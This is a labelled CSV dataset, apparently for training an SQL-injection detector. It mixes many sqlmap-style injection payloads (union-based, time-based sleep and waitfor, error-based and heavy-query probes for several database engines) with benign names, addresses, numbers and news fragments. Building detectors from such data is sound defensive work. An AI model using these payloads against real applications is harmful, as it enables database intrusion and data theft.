Sentence,Label
" select * from users where id = '1' +  ( \ )  union select 1,@@VERSION -- 1'",1
tei,0
alicanto,0
salome,0
38844,0
protti tarrasa,0
zorita de la frontera,0
"-5998"" )  as gazd where 2814 = 2814 union all select 2814,2814,2814,2814,2814,2814,2814--",1
desencorvar,0
gabby,0
zael,0
thirugna,0
02100,0
maas@tobarisch.ke,0
"-4327"" or make_set ( 3107 = 1781,1781 )  and ""lclf"" like ""lclf",1
loyola,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq  )  )  +',1
"1"" )  and 2006 = 2006",1
-4518 where 8023 = 8023 or 6872 = 6872--,1
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and 'qcsi' = 'qcsi",1
matienzo gallifa,0
"1' )  as ohcs where 9588 = 9588 or elt ( 6272 = 6272,sleep ( 5  )  )  --",1
innota,0
gorrochotegui blade,0
9785799371195740,0
"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  ",1
"1""  )  )   )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( ""urqg"" = ""urqg",1
"calle lirios, 51, 3?a",0
"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",1
herling,0
"1'  )  )   and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (  'pbtf' = 'pbtf",1
" One intersex person , according BBC , said years later , &quot; I neither man woman ",0
1433,0
1180317448071698,0
" select * from users where id = 1 or 1#""; union select null,version (  )  -- 1",1
select  ( case when  ( 7852 = 7476 )  then 7852 else 7852* ( select 7852 from mysql.db )  end ) #,1
"calle aguamarina, 193 10-d",0
05701,0
"1%""  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( ""%"" = """,1
suzane,0
hotson,0
inda,0
1' )  and 7533 = 7533 and  ( 'cryr' = 'cryr,1
"1  )  )   )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
7340,0
55585768n,0
besch@qcole.bt,0
"1'  )  )   as ovbz where 3203 = 3203  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --",1
-2783%'  )  )   or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  '%' = ',1
"1 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) # ehsr",1
1%'  )  )   )  order by 1#,1
postema,0
" As recently last Tuesday , Nasdaq indices calculated one hour due data transfer errors ",0
10858,0
jocs olimpics 110 1-b,0
capa0r980,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'gtcb' = 'gtcb",1
seiter.segev@mataluenga.bs,0
1764760587372326,0
dement,0
gonzales_thalasso@magadan.com.jm,0
" Fifth place went Artur Brückner , responsible organising music copies ",0
con10e4t2,0
"plaa doctor robert, 127",0
19262,0
50239662a,0
127ca3o,0
 Passengers supposed turn devices plane descends land restart plane ground ,0
karola5,0
apolonio,0
"1""  )  )   and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  ""kldp"" like ""kldp",1
-9840'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'dzlp' = 'dzlp,1
"calle el pilar s/n,",0
dalmiro,0
espineta astorquiza,0
"1""  )  )   )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (   ( ""dnlz"" = ""dnlz",1
03331390r,0
mollerus,0
arbuckle,0
47270196k,0
"1""  )  )   or sleep ( 5 ) #",1
" Furthermore , event days , 11",0
kangning,0
c96reveidil5,0
"1'|| ( select 'txyy' where 6500 = 6500 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1  )  )  ||'",1
" That &apos;s around 600 million pounds worth Hershey bars , lollipops , Milk Duds , Twizzlers Clark Bars ",0
kariann,0
redmond-delcampe@biosaludsystems.do,0
select  ( case when  ( 5752 = 6036 )  then 1 else 5752* ( select 5752 from master..sysdatabases )  end ) --,1
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph",1
citti@manjarr.zw,0
"select * from generate_series ( 7494,7494,case when  ( 7494 = 7854 )  then 1 else 0 end )  limit 1--",1
51620770f,0
-2402 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) -- szgq,1
nirma,0
"1 where 2146 = 2146 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
78370849m,0
sandford@directoriogratuito.yu,0
san andrs del rey,0
47220,0
8319713871546470,0
oblong0,0
digiacom,0
"1'  )  )   )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'tvar' = 'tvar",1
1  )  )   )  and 8990 = 4775 and   (  (   ( 1894 = 1894,1
34406,0
17707,0
 They teach us abide spontaneous impression good-humored inflexibility whole cry voices side,0
" Charlie Brown introduced us The Great Pumpkin kids , carving jack-o-lantern like decorating Christmas tree - &apos;s something &apos;ve done since little ",0
"1' and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and 'gzlz' like 'gzlz",1
 A virus check also carried recipient systems ,0
juan de dios,0
38355013y,0
"1""  )  )   as xbhp where 7527 = 7527",1
flota5iento,0
; exec  ( 'sel' + 'ect us' + 'er' ) ,1
tornielli heusser,0
15618,0
3335,0
ilana,0
sed4e748,0
snelgrov,0
jenner,0
25132,0
"-4822"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and ""owbp"" = ""owbp",1
pa,0
ervin,0
trace,0
5966,0
"1'|| ( select 'hvqw' from dual where 4423 = 4423 union all select null,null,null--",1
selles tanari,0
fernan-gomez@juegosgratisinternet.sj,0
norma,0
perjura,0
castellcir,0
55,0
"com"" style = ""max-width:450px;float:left;padding:10px 10px 10px 0px;border:0px;""> As type buying selling turn 2145 215 22 220 540 543 544473 buy omnicef diners club store 544473""> buy omnicef diners club store </a>  544473""]buy omnicef diners club store[/url] 9ArATgxuN99s5bw1e@V$K@JrLjlTnn1aFZqEw2cH@V$K@1d2RRER7vmuzdd4nPCz@V$K@/CkclyEqatPpZvNr  </methodCall>   </methodCall> 482  </params>   <?xml version = ""1",0
2777667912628191,0
childree,0
"patio poeta luis rosales, 50 8f",0
to85lo372,0
ramss,0
bho,0
4302979715945309,0
ag2u7a,0
"1%' )  union all select null,null#",1
sweeney,0
pinar vives,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (   ( 'ksoc' = 'ksoc,1
04270,0
yessica,0
8683,0
"1"" )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and  ( ""btht"" = ""btht",1
"15pm Wednesday , eagle-eyed dog walker spotted Ruby ledge quarry , stranded 50ft ",0
admin' )  or  ( '1' = '1'/*,1
" The children receive help regional artisans , present 11",0
menndez coyoma,0
"c/ moncayo, 36, 10-d",0
blisse,0
"1  )  )   and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  5507 = 5507",1
" &quot; I remain patchwork created doctors , bruised scarred ",0
3786004753545909,0
"1%""  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( ""%"" = """,1
"dels segons jocs mediterranis 86, 3-h",0
s353icia41838e,0
" Many people treated malaria , tuberculosis , malnutrition , diabetes , parasites sexually transmitted diseases ",0
isolda,0
"calle beato tomas de zumarraga, 89 12-c",0
deimos 147 12?a,0
ad28rsari!a,0
1'|| ( select 'pcps' from dual where 7255 = 7255 and 7121 = 4603,1
1'  )  )   and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'mmfq' = 'mmfq,1
legista,0
jara escobedo,0
zorita del maestrazgo,0
arenas,0
peek@clubforex.ax,0
ehrlich.selwyne@ebaz.ba,0
violy belcastro,0
7znallo,0
"c/ salvador 64, 5c",0
"1  )  )   as huxq where 7451 = 7451 union all select null,null,null--",1
" Now , Airbus appealing directly public ahead Dubai Airshow , 777X expected dominate 100 orders ",0
descapotar,0
3195365184301828,0
tribaldos,0
eisenberg@muchochinoenchina.mx,0
08enmand15a,0
-6500'  )  )   or  ( 8459 = 8459 ) *4906 and   (  (  'padu' like 'padu,1
orencia,0
wester0,0
25300,0
"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  # igen",1
"1' )  where 9951 = 9951  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --",1
cado,0
"-3362' where 6567 = 6567 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
l9n0e7no,0
"1""  )  )   procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (  ""jzbb"" = ""jzbb",1
elian,0
"1"" or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and ""oyou"" = ""oyou",1
7892581903274474,0
torre,0
"1"" where 9342 = 9342 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1
3772,0
 Frontier Airlines charge carry-on baggage Frontier Airlines plans charge $ 100 passengers store carry-on luggage board flight ,0
 end and  ( 'jzlr' = 'jzlr,1
cervecera,0
1' waitfor delay '0:0:5' and 'dtej' like 'dtej,1
2018025974604227,0
"1%'  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( '%' = '",1
 The Verkehrsclub Deutschland (German Traffic Club) opinion increase two decades &quot; completely appropriate actually long overdue &quot; ,0
3156,0
1'+ ( select taga where 8036 = 8036,1
"iif ( 2205 = 4764,1,1/0 ) ",1
49832,0
jernima,0
"1' )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) ",1
"-7637"" union all select 8498,8498,8498--",1
 Airlines show FAA airplanes meet new guidelines &apos;ve updating flight crew training manuals rules stowing devices reflect new guidelines ,0
culpada,0
"1%'  )  )   or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  '%' = '",1
1  )  )   as kiqk where 7366 = 7366 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
manchita,0
 The issue resolved evening ,0
hocutt,0
"1""  )  )   procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (  ""hhwy"" = ""hhwy",1
wackernagel@tiendasyofertas.je,0
" To keep alive , well , &apos;s reason keep alive ",0
" The solicitor , nicknamed &quot; Bash &quot; hailed criminals &quot; top brief , &quot; arrested home 2011 following police surveillance operation Scarborough , represented previous narcotics trial ",0
requena de campos,0
"1"" )  where 7840 = 7840 union all select null,null#",1
"-3219"" )  order by 1--",1
arrego76arse,0
desligar,0
difusora,0
 It something people wanted ,0
1'  )  )   as yyud where 4934 = 4934,1
"1"" or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  ",1
"1 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1
"de canoves 13,",0
01193,0
pelez bastus,0
-5291'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'tmpm' = 'tmpm,1
"travesia palacio 61, 1?d",0
"1 )  as jqbv where 8172 = 8172 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
herbers,0
select case when 2930 = 7964 then 1 else null end--,1
"iif ( 1217 = 8831,1,1/0 ) ",1
913,0
roseman-hensley@fighting-machines.wf,0
" Iran satisfied nuclear negotiations process Iran expressed satisfaction negotiation process , one week next nuclear meeting five UN veto powers Germany ",0
" &quot; Experience also shown individual announcements relatively seldom taken notice , time , information regarding changes departure gates flight times somewhat lost among , &quot; said Kleeman chatting radio broadcaster ",0
1 where 9393 = 9393 waitfor delay '0:0:5'--,1
nanclares espejo,0
giertych,0
 ( 7098 = 7098 and sleep ( 5  )  )  ,1
alobras,0
"1' or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and 'ebuo' = 'ebuo",1
3428501234979373,0
charley,0
ribot velugo,0
doretta5,0
tecolote,0
antonino,0
" According details provided , tunnel yet put use ",0
borgeaud@enmenorca.com.om,0
"1""  )  )   as brwj where 9180 = 9180",1
gunderso,0
' or 2 > 1,1
mcarthur,0
"c/ francisco santos, 96",0
diego medina 82 5-b,0
gidaro,0
"1'|| ( select 'gikt' where 8447 = 8447 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
44494,0
"calle godelleta, s/n",0
"1%"" )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
349,0
laffan@phd-photodecor.bv,0
"-1550%""  )  )   )  order by 1--",1
4245052344943379,0
"1' )  where 5799 = 5799 union all select null,null,null,null,null--",1
5660834660076309,0
suau,0
"1' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( 'sqni' like 'sqni",1
 At least one hacktivist group online claimed responsible bringing NSA site DDoS attack ,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (  'quqx' = 'quqx",1
" I expect UK distance project , hoping cosy US ",0
"1"" )  as cxwd where 5800 = 5800 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"1'+ ( select 'gjaq' where 5449 = 5449 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null  )  )  +'",1
-1087 )  where 5787 = 5787 union all select 5787#,1
33527,0
luthin,0
walberto,0
"1""  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( ""rtzn"" = ""rtzn",1
1%' )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( '%' = ',1
3714419514854077,0
g46r2ch4,0
lischyns,0
ergo226825e,0
"1' )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ",1
1 where 9620 = 9620 waitfor delay '0:0:5'--,1
"select count ( * )  from generate_series ( 1,5000000 ) ",1
 Pangerl sped finish line first place ,0
" Libertarians joined environmental groups lobbying allow government use little boxes keep track miles drive , possibly drive - use information draw tax bill ",0
ambligonio,0
denys,0
ryall,0
mitsuter,0
"1' or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
43507844d,0
1 where 4003 = 4003 union all select null--,1
ribes cerf,0
05202,0
yaser,0
9p30a,0
bellveh badrenas,0
"1 )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  ",1
"c/ francisco javier simonet 7, 11?e",0
edi,0
"1"" )  and 8677 = 9054#",1
-1854' )  as fmmq where 7326 = 7326 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,1
"1%' and make_set ( 1227 = 5627,5627 )  and '%' = '",1
1' waitfor delay '0:0:5',1
1  )  )   and 9198 = 9198--,1
guize_ranson@infotek.bn,0
1%' or sleep ( 5 ) #,1
"1'|| ( select 'ojdz' where 7350 = 7350 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  ||'",1
avenida patrimonio de la humanidad 64 13-a,0
select  ( case when  ( 3626 = 6022 )  then 3626 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
carpool,0
mccaig,0
" That said , I hope finally start winning ",0
 Thirty five men involved racket jailed total 153 years drugs offences ,0
hoya-gonzalo,0
regalbuto@apuestatealgo.nr,0
"-5438"" )  union all select 3170,3170--",1
"1' in boolean mode )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
 Tripodi denies influenced Obeid Former NSW Labor minister Joe Tripodi investigated state &apos;s corruption watchdog ,0
1'|| ( select 'qstz' where 6835 = 6835,1
codos,0
"1',exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 7759 = 7759,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1
